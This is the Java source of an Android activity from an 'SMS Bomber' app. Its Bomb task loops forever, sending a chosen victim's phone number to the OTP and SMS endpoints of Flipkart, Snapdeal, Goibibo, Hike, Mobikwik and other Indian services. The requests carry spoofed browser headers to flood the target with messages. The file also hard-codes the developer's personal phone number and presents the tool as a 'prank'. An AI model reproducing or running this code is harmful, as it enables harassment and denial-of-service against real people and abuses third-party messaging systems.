package co.deucate.smsbomber;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.RecyclerView;
import android.text.TextUtils;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeErrorDialog;
import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeNoticeDialog;
import com.awesomedialog.blennersilva.awesomedialoglibrary.interfaces.Closure;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.InterstitialAd;
import com.google.android.gms.ads.MobileAds;
import com.google.android.gms.ads.reward.RewardItem;
import com.google.android.gms.ads.reward.RewardedVideoAd;
import com.google.android.gms.ads.reward.RewardedVideoAdListener;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

@SuppressWarnings("ALL")
public class HomeActivity extends AppCompatActivity implements RewardedVideoAdListener {

    private static final String TAG = "HomeActivity";
    private static final int REQUEST_CONTACT_NUMBER = 32;
    String mPhoneNumber, mLog;
    RecyclerView mRecyclerView;
    EditText mPhoneEt;
    TextView mStatusTV;
    LinearLayout mPhoneLayout;
    AdRequest adRequest;


    private InterstitialAd interstitialAd;

    Thread mThread;
    Date cuttuntTime = null;
    int a, current, latest;

    private RewardedVideoAd mRewardedVideoAd;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (!isNetworkAvailable()) {
            addLog("#FF0000", "Please connect to network");
            return;
        }

        mRewardedVideoAd = MobileAds.getRewardedVideoAdInstance(this);
        mRewardedVideoAd.setRewardedVideoAdListener(this);

        try {
            PackageInfo pInfo = this.getPackageManager().getPackageInfo(getPackageName(), 0);
            current = pInfo.versionCode;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        getLatestVersion();

        adRequest = new AdRequest.Builder().build();

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (interstitialAd.isLoaded()) {
                    interstitialAd.show();
                    interstitialAd.loadAd(adRequest);
                } else {
                    addLog("#FFFF00", "Wait for 10-15 second.");
                    interstitialAd.loadAd(adRequest);
                }
            }
        }, 60000);

        new AwesomeNoticeDialog(this)
                .setTitle("Warning")
                .setMessage("I(Developer of this app) is not responcible for any thing you did with this app. This app is only for prank. If you are not agree with my term and condition please don't use this app. In case you report my app or me i can take action to you.")
                .setColoredCircle(R.color.dialogWarningBackgroundColor)
                .setDialogIconAndColor(R.drawable.ic_dialog_warning, R.color.white)
                .setCancelable(true)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setButtonBackgroundColor(R.color.dialogWarningBackgroundColor)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setNoticeButtonClick(new Closure() {
                    @Override
                    public void exec() {

                    }
                })
                .show();

        AdView adView = findViewById(R.id.mainBottomBannerAd);
        AdRequest adRequest1 = new AdRequest.Builder().build();
        adView.loadAd(adRequest1);

        MobileAds.initialize(this, "ca-app-pub-8086732239748075~8890173650");

        interstitialAd = new InterstitialAd(this);
        interstitialAd.setAdUnitId("ca-app-pub-8086732239748075/9598708915");
        interstitialAd.loadAd(new AdRequest.Builder().build());

        mPhoneEt = findViewById(R.id.mainPhoneEt);
        mPhoneLayout = findViewById(R.id.linearLayout);
        mStatusTV = findViewById(R.id.mainStatus);
        mRecyclerView = findViewById(R.id.mainRecyclerView);

//        mLog = mLogTV.getText().toString();

        findViewById(R.id.mainOkBtn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mPhoneNumber = mPhoneEt.getText().toString();

                if (TextUtils.isEmpty(mPhoneNumber)) {
                    addLog("#FFFF00", "Please enter mobile number");
                    return;
                }

                if (!isNetworkAvailable()) {
                    addLog("#FF0000", "Please connect to network");
                    return;
                }

                if (interstitialAd.isLoaded()) {
                    interstitialAd.show();
                } else {
                    addLog("#FFFF33", "Please wait 10-15 second. Server is busy.");
                    interstitialAd.loadAd(adRequest);
                    return;
                }

                if (isDeveloperNumber(mPhoneNumber)) {
                    addLog("#FF0000", "Bombing on creator of this app does not make sense.");
                    return;
                }
                getCurrentTime();
                isProtectedNumber();

            }
        });

        findViewById(R.id.contactBtn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                if (!isNetworkAvailable()) {
                    addLog("#FF0000", "Please connect to network");
                    return;
                }

                Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
                startActivityForResult(intent, REQUEST_CONTACT_NUMBER);
            }
        });

        interstitialAd.setAdListener(new AdListener() {
            @Override
            public void onAdLoaded() {
                addLog("#FFFF33", "Server up");
            }

            @Override
            public void onAdFailedToLoad(int errorCode) {
                addLog("#FF0000", "Errorcode : " + errorCode);
                interstitialAd.loadAd(adRequest);
            }

            @Override
            public void onAdOpened() {
                // Code to be executed when the ad is displayed.

            }

            @Override
            public void onAdLeftApplication() {
                // Code to be executed when the user has left the app.
            }

            @Override
            public void onAdClosed() {
                interstitialAd.loadAd(adRequest);
            }
        });


    }

    private void isProtectedNumber() {

        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
        firestore.collection("Protected").document(mPhoneNumber).get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                DocumentSnapshot snapshot = task.getResult();
                if (snapshot.exists()) {

                    String timeString = snapshot.getString("Time");
                    timeString = timeString.replace("T", " ");
                    timeString = timeString.replace("Z", " ");

                    SimpleDateFormat dateFormat2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:SS.SSS");

                    try {
                        Date temp = dateFormat2.parse(timeString);

                        long difference = temp.getTime() - cuttuntTime.getTime();
                        long days = (int) (difference / (1000 * 60 * 60 * 24));
                        long hours = (int) ((difference - (1000 * 60 * 60 * 24 * days)) / (1000 * 60 * 60));
                        long min = (int) (difference - (1000 * 60 * 60 * 24 * days) - (1000 * 60 * 60 * hours)) / (1000 * 60);
                        hours = (hours < 0 ? -hours : hours);

                        if (hours >= 3) {
                            new Bomb().execute();
                        } else {
                            addLog("#FF0000", "This number is protected please tray again after some while.");
                        }
                    } catch (ParseException e) {
                        e.printStackTrace();
                    } catch (NullPointerException e) {
                        e.printStackTrace();
                    }


                } else {
                    new Bomb().execute();
                }
            }
        });
    }

    private void getCurrentTime() {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder().url("https://us-central1-smsbomber-e784b.cloudfunctions.net/Time").build();

        Call call = client.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {

                //noinspection ConstantConditions
                String JSONData = response.body().string();
                HashMap<String, Object> data = new HashMap<>();

                try {
                    JSONObject root = new JSONObject(JSONData);
                    String timeString = root.getString("Time");

                    timeString = timeString.replace("T", " ");
                    timeString = timeString.replace("Z", " ");

                    SimpleDateFormat dateFormat2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:SS.SSS");

                    Date temp = dateFormat2.parse(timeString);

                    cuttuntTime = temp;

                } catch (JSONException e) {
                    e.printStackTrace();
                } catch (ParseException e) {
                    e.printStackTrace();
                }

            }
        });
    }

    private void loadRewardedVideoAd() {
        mRewardedVideoAd.loadAd("ca-app-pub-8086732239748075/7406638658", new AdRequest.Builder().build());
    }

    private void getLatestVersion() {

        FirebaseFirestore firestore = FirebaseFirestore.getInstance();

        firestore.collection("Current").document("version").get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                if (task.isSuccessful()) {
                    DocumentSnapshot snapshot = task.getResult();
                    latest = Integer.parseInt(snapshot.getString("v"));

                    if (current != latest) {
                        showErrorDialog();
                    }

                }
            }
        });

    }

    private void showErrorDialog() {

        new AwesomeErrorDialog(this)
                .setTitle(R.string.app_name)
                .setMessage("Your app is not up to date please update you app to get latest feature.")
                .setColoredCircle(R.color.dialogErrorBackgroundColor)
                .setDialogIconAndColor(R.drawable.ic_dialog_error, R.color.white)
                .setCancelable(true).setButtonText(getString(R.string.dialog_ok_button))
                .setButtonBackgroundColor(R.color.dialogErrorBackgroundColor)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setErrorButtonClick(new Closure() {
                    @Override
                    public void exec() {
                        Intent intent = new Intent(Intent.ACTION_VIEW);
                        intent.setData(Uri.parse("https://smsbomber.deucate.com/others/latest.apk"));
                    }
                })
                .show();
    }

    private boolean isDeveloperNumber(String phoneNumber) {

        phoneNumber = phoneNumber.replace(" ", "");
        char[] number = phoneNumber.toCharArray();
        char[] myNumber = "9664769226".toCharArray();


        for (int i = 0; i < 10; i++) {
            if (number[i] != myNumber[i]) {
                return false;
            }
        }

        return true;
    }

    @Override
    public void onRewardedVideoAdLoaded() {
        mRewardedVideoAd.show();
    }

    @Override
    public void onRewardedVideoAdOpened() {

    }

    @Override
    public void onRewardedVideoStarted() {

    }

    @Override
    public void onRewardedVideoAdClosed() {
    }

    @Override
    public void onRewarded(RewardItem rewardItem) {
    }

    @Override
    public void onRewardedVideoAdLeftApplication() {
    }

    @Override
    public void onRewardedVideoAdFailedToLoad(int i) {
    }

    @Override
    public void onRewardedVideoCompleted() {
    }


    @SuppressLint("StaticFieldLeak")
    private class Bomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            mThread = new Thread(new Runnable() {
                @Override
                public void run() {

                    confirmTKT();
                    mobikwick();
                    hike();
                    justdial();
                    piasabazar();
                    goibibo();
                    snapdeal();
                    homeshop18();
                    flipkart();

                }
            });
            mThread.start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new Bomb().execute();

        }
    }

    private void flipkart() {
        OkHttpClient localOkHttpClient = new OkHttpClient();
        RequestBody localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "loginId=%2B91" + mPhoneNumber);
        localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/5/user/otp/generate").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "21").addHeader("cookie", mPhoneNumber).addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {

            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                updateStatus("Flipkart");
            }
        });
    }

    private void homeshop18() {
        OkHttpClient localOkHttpClient1 = new OkHttpClient();
        RequestBody localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "submit=submit&identity=" + mPhoneNumber + "&otpType=SIGNUP_OTP");
        localOkHttpClient1.newCall(new Request.Builder().url("https://mbe.homeshop18.com/services/secure/user/generate/otp").post(localRequestBody1).addHeader("x-hs18-app-version", "3.1.0").addHeader("x-hs18-app-id", "0").addHeader("x-hs18-device-version", "25").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("accept-charset", "UTF-8").addHeader("x-hs18-app-platform", "androidApp").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {

            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                updateStatus("Homeshop18");
            }
        });
    }

    private void snapdeal() {
        OkHttpClient localOkHttpClient2 = new OkHttpClient();
        RequestBody localRequestBody2 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "emailId=&mobileNumber=" + mPhoneNumber + "&purpose=LOGIN_WITH_MOBILE_OTP");
        localOkHttpClient2.newCall(new Request.Builder().url("https://www.snapdeal.com/sendOTP")
                .post(localRequestBody2).addHeader("host", "www.snapdeal.com")
                .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
                .addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5")
                .addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.snapdeal.com/iframeLogin")
                .addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest")
                .addHeader("content-length", "62").addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {

            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                updateStatus("Snapdeal");
            }
        });
    }

    private void goibibo() {
        OkHttpClient localOkHttpClient3 = new OkHttpClient();
        RequestBody localRequestBody3 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
        localOkHttpClient3.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {

            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                updateStatus("Goibibo");
            }
        });
    }

    private void piasabazar() {
        OkHttpClient localOkHttpClient11 = new OkHttpClient();
        RequestBody localRequestBody11 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mobile_number=" + mPhoneNumber + "&step=send_password&request_page=landing");
        localOkHttpClient11.newCall(new Request.Builder().url("https://myaccount.paisabazaar.com/my-account/").post(localRequestBody11).addHeader("host", "myaccount.paisabazaar.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "application/json, text/javascript, */*; q=0.01").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://myaccount.paisabazaar.com/my-account/").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest").addHeader("content-length", "64").addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {

            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                updateStatus("Paisabazaar");
            }
        });
    }

    private void justdial() {
        String str = "https://www.justdial.com/functions/ajxandroid.php?phn=" + mPhoneNumber + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile";
        new OkHttpClient().newCall(new Request.Builder().url(str).addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                updateStatus("Justdial");

            }
        });
    }

    private void hike() {
        MediaType localMediaType0 = MediaType.parse("application/json; charset=utf-8");
        HashMap localHashMap0 = new HashMap();
        localHashMap0.put("method", "pin");
        localHashMap0.put("msisdn", "+91".concat(mPhoneNumber));
        JSONObject localJSONObject121 = new JSONObject(localHashMap0);
        OkHttpClient localOkHttpClient121 = new OkHttpClient();
        RequestBody localRequestBody121 = RequestBody.create(localMediaType0, localJSONObject121.toString());
        localOkHttpClient121.newCall(new Request.Builder().url("http://api.im.hike.in/v3/account/validate?digits=4").post(localRequestBody121).addHeader("content-type", "application/json; charset=utf-8").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {

            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                updateStatus("Hike");
            }
        });
    }

    private void mobikwick() {
        MediaType localMediaType001 = MediaType.parse("application/json; charset=utf-8");
        HashMap localHashMap001 = new HashMap();
        localHashMap001.put("cell", mPhoneNumber);
        JSONObject localJSONObject001 = new JSONObject(localHashMap001);
        OkHttpClient localOkHttpClient001 = new OkHttpClient();
        RequestBody localRequestBody001 = RequestBody.create(localMediaType001, localJSONObject001.toString());
        localOkHttpClient001.newCall(new Request.Builder().url("https://appapi.mobikwik.com/p/account/otp/cell").post(localRequestBody001).addHeader("content-type", "application/json").addHeader("User-Agent", "").addHeader("X-App-Ver", "1").addHeader("X-MClient", "1").build()).enqueue(new Callback() {
            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
            }

            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
                updateStatus("MobiKWICK");
            }
        });
    }

    private void confirmTKT() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                WebView webView = new WebView(HomeActivity.this);
                webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
                webView.setWebViewClient(new WebViewClient());
                updateStatus("ConfirmTKT");
            }
        });
    }

    private void updateStatus(final String s) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                mStatusTV.setText(s);
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.overflow, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        switch (item.getItemId()) {
            case R.id.menuAbout: {
                addLog("#0000FF", "Created by\n"+getString(R.string.credit));
                return true;
            }

            case R.id.menuWeb: {
                addLog("#00FF00", "Thank you for open my website. God bless you with 100 child.");
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("https://deucate.com/"));
                startActivity(intent);
                return true;
            }

            case R.id.menuProtect: {
                startActivity(new Intent(HomeActivity.this, ProtectedActivity.class));
                return true;
            }

            default: {
                return super.onOptionsItemSelected(item);
            }
        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        if (resultCode == RESULT_OK && requestCode == REQUEST_CONTACT_NUMBER) {


            if (interstitialAd.isLoaded()) {
                interstitialAd.show();
                interstitialAd.loadAd(adRequest);

            } else {
                addLog("#FFFF00", "Wait for 10-15 second.");
                interstitialAd.loadAd(adRequest);
                return;
            }

            Uri uri = data.getData();
            @SuppressLint("Recycle")
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            assert cursor != null;
            cursor.moveToFirst();
            int colum = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            String numberT = cursor.getString(colum);
            String number = "";
            if (numberT.contains("+")) {
                numberT = numberT.substring(3);
                number = numberT.replaceAll(" ", "");
                mPhoneNumber = number;
                mPhoneEt.setText(number);
            } else {
                number = numberT.replaceAll(" ", "");
                mPhoneNumber = number;
                mPhoneEt.setText(mPhoneNumber);
            }

            if (isDeveloperNumber(mPhoneNumber)) {
                addLog("#FF0000", "Bombing on creator of this app dosen't make sence. :(");
                return;
            }
            mPhoneNumber = numberT;
            mPhoneEt.setText(numberT);
            new Bomb().execute();

        }

    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    private void addLog(String color, String log) {
        String oldData = log;

        String newLog = "<font color='" + color + "'>" + log + "</font>";
        mLog += "<br/>> " + newLog;
        //mLogTV.setText(Html.fromHtml(mLog));
    }

    @Override
    public void onResume() {
        mRewardedVideoAd.resume(this);
        super.onResume();
    }

    @Override
    public void onPause() {
        mRewardedVideoAd.pause(this);
        super.onPause();
    }

    @Override
    public void onDestroy() {
        mRewardedVideoAd.destroy(this);
        super.onDestroy();
    }

}
